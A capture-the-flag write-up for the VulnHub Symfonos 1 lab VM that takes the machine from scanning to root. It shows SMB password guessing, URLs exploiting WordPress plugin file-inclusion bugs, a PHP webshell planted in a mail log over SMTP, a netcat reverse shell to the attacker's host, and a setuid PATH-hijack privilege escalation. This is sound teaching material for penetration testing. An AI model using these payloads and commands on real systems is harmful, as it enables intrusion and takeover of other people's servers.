# Symfonos | VulnHub
https://www.vulnhub.com/entry/symfonos-1,322/

### 1. Scan
```bash
Nmap scan report for 192.168.34.141
Host is up, received arp-response (0.00092s latency).
Scanned at 2021-07-03 21:59:14 EDT for 22s
Not shown: 65530 closed ports
Reason: 65530 resets
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEgzdI5IpQcFfjqrj7pPhaxTxIJaS0kXjIektEgJg0+jGfOGDi+uaG/pM0Jg5lrOh4BElQFIGDQmf10JrV5CPk/qcs8zPRtKxOspCVBgaQ6wdxjvXkJyDvxinDQzEsg6+uVY2t3YWgTeSPoUP+QC4WWTS/r1e2O2d66SIPzBYVKOP2+WmGMu9MS4tFY15cBTQVilprTBE5xjaO5ToZk+LkBA6mKey4dQyz2/u1ipJKdNBS7XmmjIpyqANoVPoiij5A2XQbCH/ruFfslpTUTl48XpfsiqTKWufcjVO08ScF46wraj1okRdvn+1ZcBV/I7n3BOrXvw8Jxdo9x2pPXkUF
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD8/lJjmeqerC3bEL6MffHKMdTiYddhU4dOlT6jylLyyl/tEBwDRNfEhOfc7IZxlkpg4vmRwkU25WdqsTu59+WQ=
|   256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOinjerzzjSIgDxhdUgmP/i6nOtGHQq2ayeO1j1h5d5a
25/tcp  open  smtp        syn-ack ttl 64 Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Issuer: commonName=symfonos
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-06-29T00:29:42
| Not valid after:  2029-06-26T00:29:42
| MD5:   086e c75b c397 34d6 6293 70cd 6a76 c4f2
| SHA-1: e3dc 7293 d59b 3444 d39a 41ef 6fc7 2006 bde4 825f
| -----BEGIN CERTIFICATE-----
| MIICyzCCAbOgAwIBAgIJAJzTHaEY8CzbMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV
| BAMMCHN5bWZvbm9zMB4XDTE5MDYyOTAwMjk0MloXDTI5MDYyNjAwMjk0MlowEzER
| MA8GA1UEAwwIc3ltZm9ub3MwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
| AQDMqUx7kERzGuX2GTokAv1cRHV81loI0yEE357TgkGOQEZUA9jpAkceEpjHGdu1
| PqfMxETG0TJYdajwYAxr01H5fJmLi04OhKHyKk+yKIRpOO0uU1tvIcpSx5A2QJky
| BY+q/82SZLhx/l2xyP2jrc63mz4FSrzav/oPpNT6rxLoPIvJ8z+vnUr3qp5Ea/DH
| WRePqBVoMqjqc9EGtwND1EMGJKlZb2KeDaqdJ02K3fZQmyR0+HyYoKq93+sKk34l
| 23Q7Tzuq07ZJXHheyN3G6V4uGUmJTGPKTMZlOVyeEo6idPjdW8abEq5ier1k8jWy
| IzwTU8GmPe4MR7csKR1omk8bAgMBAAGjIjAgMAkGA1UdEwQCMAAwEwYDVR0RBAww
| CoIIc3ltZm9ub3MwDQYJKoZIhvcNAQELBQADggEBAF3kiDg7BrB5xNV+ibk7GUVc
| 9J5IALe+gtSeCXCsk6TmEU6l2CF6JNQ1PDisZbC2d0jEEjg3roCeZmDRKFC+NdwM
| iKiqROMh3wPMxnHEKgQ2dwGU9UMb4AWdEWzNMtDKVbgf8JgFEuCje0RtGLKJiTVw
| e2DjqLRIYwMitfWJWyi6OjdvTWD3cXReTfrjYCRgYUaoMuGahUh8mmyuFjkKmHOR
| sMVCO/8UdLvQr7T8QO/682shibBd4B4eekc8aQa7xoEMevSlY8WjtJKbuPvUYsay
| slgPCkgga6SRw1X/loPYutfIvK7NQPqcEM8YrWTMokknp7EsJXDl85hRj6GghhE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 00:0C:29:1C:7E:F0 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/3%OT=22%CT=1%CU=34750%PV=Y%DS=1%DC=D%G=Y%M=000C29%TM
OS:=60E11608%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%
OS:TS=8)OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O5
OS:=M5B4ST11NW6%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=
OS:7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  3 21:59:36 2021 -- 1 IP address (1 host up) scanned in 23.55 seconds
```
The machine is running an Apache web server, SSH, SMB and SMTP.

### 2. Look at SMB
Perform some enumeration of SMB.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ smbmap -R -H 192.168.34.141 -P 445 --depth 20
[+] Guest session       IP: 192.168.34.141:445  Name: 192.168.34.141                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        helios                                                  NO ACCESS       Helios personal share
        anonymous                                               READ ONLY
        .\anonymous\*
        dr--r--r--                0 Fri Jun 28 21:14:49 2019    .
        dr--r--r--                0 Fri Jun 28 21:12:15 2019    ..
        fr--r--r--              154 Fri Jun 28 21:14:49 2019    attention.txt
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.5.16-Debian)
```
There's an attention to txt file on the anonymous share.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ smbclient //192.168.34.141/anonymous      
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun 28 21:14:49 2019
  ..                                  D        0  Fri Jun 28 21:12:15 2019
  attention.txt                       N      154  Fri Jun 28 21:14:49 2019

                19994224 blocks of size 1024. 17200360 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 154 as attention.txt (15.0 KiloBytes/sec) (average 15.0 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                                   
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ cat attention.txt                                                                                           

Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus
```

Cool so now we have some possible passwords: 'epidioko', 'qwerty' and 'baseball'. Since there is a share described "Helios personal share", try to login to that share as helios with one of there passwords.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ smbclient -U helios //192.168.34.141/helios
Enter WORKGROUP\helios's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun 28 20:32:05 2019
  ..                                  D        0  Fri Jun 28 20:37:04 2019
  research.txt                        A      432  Fri Jun 28 20:32:05 2019
  todo.txt                            A       52  Fri Jun 28 20:32:05 2019

                19994224 blocks of size 1024. 17200360 blocks available
smb: \> get research.txt
getting file \research.txt of size 432 as research.txt (140.6 KiloBytes/sec) (average 140.6 KiloBytes/sec)
smb: \> get todo.txt
getting file \todo.txt of size 52 as todo.txt (16.9 KiloBytes/sec) (average 78.8 KiloBytes/sec)
smb: \> exit
```
The credentials `helios:qwerty` grant access.

```bash                                                 
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ cat research.txt 
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
                                                                                                                                                                                   
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ cat todo.txt     

1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```

That third item sounds like a directory that might appear on a web server.

### 3. Look at the website
Going to http://symfonos.local/h3l105 displays a Wordpress instance. Wpscan is only able to find one "admin" user and helios is not a valid user account. No user administration is allowed.  
Some deeper enumeration with wpscan shows some plugins have vulnerabilities.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ wpscan --url http://192.168.34.141/h3l105/ --plugins-detection aggressive --plugins-version-detection aggressive
...
[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.34.141/h3l105/wp-content/plugins/akismet/
 | Last Updated: 2021-03-02T18:10:00.000Z
 | Readme: http://192.168.34.141/h3l105/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.1.9
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.34.141/h3l105/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.1.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.34.141/h3l105/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.34.141/h3l105/wp-content/plugins/akismet/readme.txt

[+] mail-masta
 | Location: http://192.168.34.141/h3l105/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 | Readme: http://192.168.34.141/h3l105/wp-content/plugins/mail-masta/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.34.141/h3l105/wp-content/plugins/mail-masta/, status: 200
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/5136d5cf-43c7-4d09-bf14-75ff8b77bb44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10956
 |      - https://www.exploit-db.com/exploits/40290/
 |      - https://cxsecurity.com/issue/WLB-2016080220
 |
 | [!] Title: Mail Masta 1.0 - Multiple SQL Injection
 |     References:
 |      - https://wpscan.com/vulnerability/c992d921-4f5a-403a-9482-3131c69e383a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6095
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6096
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6097
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6098
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6570
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6571
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6572
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6573
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6574
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6575
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6576
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6577
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6578
 |      - https://www.exploit-db.com/exploits/41438/
 |      - https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.34.141/h3l105/wp-content/plugins/mail-masta/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.34.141/h3l105/wp-content/plugins/mail-masta/readme.txt

[+] site-editor
 | Location: http://192.168.34.141/h3l105/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 | Readme: http://192.168.34.141/h3l105/wp-content/plugins/site-editor/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.34.141/h3l105/wp-content/plugins/site-editor/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.34.141/h3l105/wp-content/plugins/site-editor/readme.txt
```

These are two local file inclusion bugs. Both of them are exploitable to retrieve local files from the system. For example, the following paths return the contents of the passwd file:  
- http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1&pl=/etc/passwd  
- http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd  
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
Debian-exim:x:105:109::/var/spool/exim4:/bin/false
messagebus:x:106:111::/var/run/dbus:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
helios:x:1000:1000:,,,:/home/helios:/bin/bash
mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:109:115::/var/spool/postfix:/bin/false
```
This shows that there is only one user on the machine - helios. With only LFI exploits to work with, a log can be poisoned on the server. There are a few options since the Apache and also SMTP are running. Unfortunately in this case the Apache user is unable to read the access logs, so that one is out.  
However, the helios user mail log is able to be read.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl http://192.168.34.141/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios       
From root@symfonos.localdomain  Fri Jun 28 21:08:55 2019
Return-Path: <root@symfonos.localdomain>
X-Original-To: root
Delivered-To: root@symfonos.localdomain
Received: by symfonos.localdomain (Postfix, from userid 0)
        id 3DABA40B64; Fri, 28 Jun 2019 21:08:54 -0500 (CDT)
From: root@symfonos.localdomain (Cron Daemon)
To: root@symfonos.localdomain
Subject: Cron <root@symfonos> dhclient -nw
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20190629020855.3DABA40B64@symfonos.localdomain>
Date: Fri, 28 Jun 2019 21:08:54 -0500 (CDT)
...
```
This is a vector that can be used to get command execution.

### 4. Get a shell
Plant a webshell in the log by sending a mail to the helios user via SMTP.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ nc symfonos.local 25
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
mail from: jack
250 2.1.0 Ok
rcpt to: helios
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
Subject: <?php echo shell_exec($_GET['cmd']); ?>       

Hello,    
See the subject of this message for important information.
Regards,
Jack

.
250 2.0.0 Ok: queued as 1B8E8406A1
quit
221 2.0.0 Bye
```
Curl to get the result.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1&pl=/var/mail/helios&cmd=id" -q | grep Subject | tail -n 1
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5344  100  5344    0     0   474k      0 --:--:-- --:--:-- --:--:--  474k
Subject: uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

See if Netcat is there.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1&pl=/var/mail/helios&c=which%20nc" -q | grep Subject | tail -n 1 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5438  100  5438    0     0   354k      0 --:--:-- --:--:-- --:--:--  379k
Subject: /bin/nc
```

It is. Try a reverse shell with a listener running.
```bash
──(kali㉿kali)-[]-[~/Desktop]
└─$ curl "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1&pl=/var/mail/helios&c=nc%20-e%20/bin/bash%20192.168.34.138%209999" -q | grep Subject | tail -n 1
```

Shell is recieved.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ nc -lvnp 9999                                                    
listening on [any] 9999 ...
connect to [192.168.34.138] from (UNKNOWN) [192.168.34.141] 33672
which python
/usr/bin/python
python -c "import pty;pty.spawn('/bin/bash')"
<ml/h3l105/wp-content/plugins/mail-masta/inc/lists$ 

<ml/h3l105/wp-content/plugins/mail-masta/inc/lists$ whoami
whoami
helios
```
Interestingly the server is running as the helios user.

### 5. Enumerate from user
Looking around the system for SETUID binaries, there is one that stands out as irregular - /opt/statuscheck.
```bash
helios@symfonos:/tmp$ export TERM=xterm
helios@symfonos:/tmp$ clear
helios@symfonos:/tmp$ find / -perm /4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/opt/statuscheck
/bin/mount
/bin/umount
/bin/su
/bin/ping
```

Strings this file to see if there are any hardcoded commands.
```bash
helios@symfonos:/tmp$ strings /opt/statuscheck 
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
curl -I H
http://lH
ocalhostH
AWAVA
AUATL
[]A\A]A^A_
;*3$"
GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
...
```

It looks like curl might be getting called without an absolute path here. This will be a path to privesc.

### 6. Escalate to root
To hijack this path with my own curl, I'll create a shell script that will make /bin/sh setuid.
```bash
helios@symfonos:/tmp$ cat << EOF > curl
> #!/bin/sh 
> chmod u+s /bin/sh  
> EOF
helios@symfonos:/tmp$ chmod +x curl
```

Modify the path to check the /tmp directory first, execute the statuscheck binary and then run /bin/sh to escalate to root.
```bash
helios@symfonos:/tmp$ export PATH=/tmp:$PATH
helios@symfonos:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
helios@symfonos:/tmp$ /opt/statuscheck
helios@symfonos:/tmp$ /bin/sh
# whoami
root
```